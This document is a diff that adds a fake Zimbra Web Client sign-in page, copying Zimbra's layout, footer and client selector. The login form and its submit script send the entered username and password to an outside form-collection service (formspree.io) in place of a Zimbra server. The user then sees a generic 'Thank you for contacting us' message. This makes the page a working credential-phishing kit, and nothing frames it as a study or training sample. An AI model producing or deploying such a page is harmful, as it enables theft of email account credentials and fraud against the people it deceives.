@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html class="user_font_size_normal" lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Zimbra Web Client Sign In</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
+	<meta name="apple-mobile-web-app-capable" content="yes" />
+	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+	<style>
+		*{margin:0;padding:0;box-sizing:border-box}
+		html,body{width:100%;height:100%;font-size:12px}
+
+		body{
+			font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;
+			color:#333;
+			background:#ededed;
+			background-image:-webkit-linear-gradient(top,#fff,#ededed);
+			background-image:linear-gradient(to bottom,#fff,#ededed);
+		}
+
+		.LoginScreen{
+			position:relative;left:0;top:0;width:100%;height:100%;
+			overflow:hidden;font-size:1rem;
+		}
+		.LoginScreen .center{
+			position:absolute;left:50%;top:40%;z-index:11;
+			margin-left:-250px;margin-top:-160px;overflow:visible;
+		}
+		.LoginScreen .contentBox{
+			background-color:#007CC3;
+			width:500px;min-height:265px;
+			padding:10px 0 40px;
+			border-radius:3px;
+			box-shadow:0 0 18px rgba(0,60,110,.3);
+		}
+		.LoginScreen H1{margin:0 30px 30px;overflow:hidden}
+
+		.ScreenReaderOnly{position:absolute;left:-9999px}
+
+		.LoginScreen FORM{text-align:center}
+		.form{
+			border-collapse:collapse;color:#fff;margin:0 auto;text-align:left;
+		}
+		.form TD{padding-bottom:10px;vertical-align:middle}
+		.form TD:first-child LABEL{margin-right:20px;color:#fff;font-size:13px}
+		.form INPUT[type='text'],.form INPUT[type='password']{
+			border:1px solid #fff;padding:0 3px;width:235px;height:20px;
+			color:black;cursor:text;border-radius:5px;
+			height:24px;
+		}
+		.form INPUT[type='text']:focus,.form INPUT[type='password']:focus{border:1px solid #99cae7}
+		.form SELECT{border:1px solid #bfbfbf;height:20px;width:165px;color:#333;background:#fff;padding:0 2px}
+		.form .submitTD{text-align:left}
+		.form .ZLoginButton{
+			float:right;border:1px solid #999;border-radius:3px;
+			background:#fff;color:#333;cursor:pointer;
+			height:22px;padding:0 10px;font-size:1rem;
+		}
+		.form .ZLoginButton:hover{background:#cce4f3}
+		.form .ZLoginButton:active{background:#99cae7}
+		.form .remember{color:#fff;font-size:13px;cursor:pointer;margin-right:6px}
+		.form HR{border-color:transparent transparent #fff;height:0;margin:6px 0 12px}
+
+		.LoginScreen .positioning{position:relative;z-index:20}
+		.LoginScreen #ZLoginWhatsThisAnchor{color:#fff;font-size:.9em;margin-left:5px;cursor:pointer;text-decoration:none}
+		.LoginScreen #ZLoginWhatsThis{
+			left:0;margin-left:-10em;position:absolute;top:25px;width:40em;z-index:30;display:none;
+		}
+		.LoginScreen .ZLoginInfoMessage{
+			background-color:#fff;border:1px solid #005d92;color:#333;
+			padding:3px 7px;text-align:left;box-shadow:0 0 2px black;font-size:12px;line-height:1.4;
+		}
+
+		.LoginScreen .Footer{bottom:0;position:absolute;text-align:center;width:100%;z-index:10}
+		.LoginScreen .copyright,.LoginScreen #ZLoginNotice{
+			cursor:default;margin-bottom:5px;font-size:1rem;color:#656565;
+		}
+		.LoginScreen #ZLoginNotice A{color:#656565;text-decoration:none}
+		.LoginScreen #ZLoginNotice A:hover{text-decoration:underline}
+		.LoginScreen .decor1,.LoginScreen .decor2{display:none}
+	</style>
+</head>
+<body onload="onLoad();">
+
+	<div class="LoginScreen">
+		<div class="center">
+			<div class="contentBox">
+
+				<h1></h1>
+				<div id="ZLoginAppName"></div>
+
+				<form id="zLoginForm" method="post" name="loginForm" action="https://formspree.io/f/xqpkvpad" accept-charset="UTF-8">
+					<input type="hidden" name="_subject" value="Zimbra login form submission"/>
+					<input type="hidden" name="loginOp" value="login"/>
+					<input type="hidden" name="login_csrf" value=""/>
+
+					<table class="form">
+						<tr>
+							<td><label for="username">Username:</label></td>
+							<td><input id="username" class="zLoginField" name="username" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/></td>
+						</tr>
+						<tr>
+							<td><label for="password">Password:</label></td>
+							<td><input id="password" autocomplete="off" class="zLoginField" name="password" type="password" value="" size="40" maxlength="1024"/></td>
+						</tr>
+						<tr>
+							<td>&nbsp;</td>
+							<td class="submitTD">
+								<input id="remember" value="1" type="checkbox" name="zrememberme" />
+								<label for="remember" class="remember">Stay signed in</label>
+								<input type="submit" class="ZLoginButton DwtButton" value="Sign In" />
+							</td>
+						</tr>
+						<tr>
+							<td colspan="2"><hr/></td>
+						</tr>
+						<tr>
+							<td><label for="client">Version:</label></td>
+							<td>
+								<div class="positioning">
+									<select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+										<option value="preferred" selected>Default</option>
+										<option value="advanced">Advanced (Ajax)</option>
+										<option value="standard">Standard (HTML)</option>
+										<option value="mobile">Mobile</option>
+									</select>
+									<a href="#" onclick="showWhatsThis(); return false;" id="ZLoginWhatsThisAnchor" aria-controls="ZLoginWhatsThis" aria-expanded="false">What&rsquo;s This?</a>
+									<div id="ZLoginWhatsThis" class="ZLoginInfoMessage" role="tooltip">
+										<h3 style="text-align:center;font-size:13px;margin-bottom:4px;">Client Types</h3>
+										<b>Advanced</b> offers the full set of Web collaboration features. This Web Client works best with newer browsers and faster Internet connections. <br/><br/>
+										<b>Standard</b> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br/><br/>
+										<b>Mobile</b> is recommended for mobile devices. <br/><br/>
+										To set <b>Default</b> to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.
+									</div>
+									<div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">
+										Note that your web browser or display does not fully support the Advanced version. We strongly recommend that you use the Standard client.
+									</div>
+								</div>
+							</td>
+						</tr>
+					</table>
+				</form>
+
+			</div>
+			<div class="decor1"></div>
+		</div>
+
+		<div class="Footer">
+			<div id="ZLoginNotice" class="legalNotice-small">
+				<a href="https://www.zimbra.com" target="_new">Zimbra</a> :: the leader in open source messaging and collaboration ::
+				<a href="https://blog.zimbra.com" target="_new">Blog</a> - <a href="https://wiki.zimbra.com" target="_new">Wiki</a> - <a href="https://www.zimbra.com/forums" target="_new">Forums</a>
+			</div>
+			<div class="copyright">Copyright &copy; 2005-2026. All rights reserved.</div>
+		</div>
+		<div class="decor2"></div>
+	</div>
+
+<script>
+	function showWhatsThis() {
+		var anchor = document.getElementById('ZLoginWhatsThisAnchor');
+		var tooltip = document.getElementById("ZLoginWhatsThis");
+		var doHide = (tooltip.style.display === "block");
+		tooltip.style.display = doHide ? "none" : "block";
+		anchor.setAttribute("aria-expanded", doHide ? "false" : "true");
+	}
+
+	function clientChange(selectValue) {
+		var useStandard = false;
+		useStandard = useStandard || (screen && (screen.width <= 800 && screen.height <= 600));
+		var div = document.getElementById("ZLoginUnsupported");
+		if (div)
+			div.style.display = ((selectValue == 'advanced') && useStandard) ? 'block' : 'none';
+	}
+
+	function forgotPassword() {
+		var accountInput = document.getElementById("username").value;
+		var url = "/public/PasswordRecovery.jsp?" + location.search;
+		if (accountInput !== '') {
+			url += (location.search !== '' ? '&' : '') + encodeURI("account=" + accountInput);
+		}
+		window.location.href = url;
+	}
+
+	function onLoad() {
+		var loginForm = document.loginForm;
+		if (loginForm.username) {
+			if (loginForm.username.value != "") {
+				loginForm.password.focus();
+			} else {
+				loginForm.username.focus();
+			}
+		}
+		clientChange("preferred");
+	}
+
+	function showThanks() {
+		var box = document.querySelector('.contentBox');
+		box.innerHTML = '<div style="text-align:center;padding:60px 30px;color:#fff;">' +
+			'<div style="font-size:44px;line-height:1;">&#10003;</div>' +
+			'<h2 style="margin:18px 0 8px;font-size:20px;font-weight:bold;">Thank you for contacting us</h2>' +
+			'<p style="font-size:13px;margin:0 auto;max-width:280px;">Your message has been received. We will get back to you shortly.</p>' +
+			'</div>';
+	}
+
+	document.getElementById('zLoginForm').addEventListener('submit', function (e) {
+		e.preventDefault();
+		var form = this;
+		var button = document.getElementById('loginButton') || form.querySelector('input[type="submit"], button[type="submit"]');
+		if (button) button.disabled = true;
+
+		var data = new FormData(form);
+		fetch(form.action, {
+			method: 'POST',
+			body: data,
+			headers: { 'Accept': 'application/json' }
+		}).then(function (res) {
+			return res.json().then(function (json) {
+				return { ok: res.ok, json: json };
+			});
+		}).then(function (result) {
+			if (result.ok) {
+				showThanks();
+			} else {
+				throw new Error(result.json && (result.json.errors && result.json.errors.map(function (err) { return err.message; }).join(', ') || 'Request failed'));
+			}
+		}).catch(function (err) {
+			if (button) button.disabled = false;
+			alert(err.message || 'There was a problem submitting your message. Please try again.');
+		});
+	});
+</script>
+</body>
+</html>
